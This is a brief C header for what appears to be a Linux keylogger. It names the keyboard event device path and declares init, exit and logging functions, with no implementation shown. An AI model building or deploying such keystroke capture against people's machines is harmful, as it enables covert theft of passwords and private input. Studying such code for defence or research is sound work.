#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define INPUT "/dev/input/by-path/platform-i8042-serio-0-event-kbd"

extern void keylogger_init(void);
extern void keylogger_exit(void);
extern const void keylogger();

#endif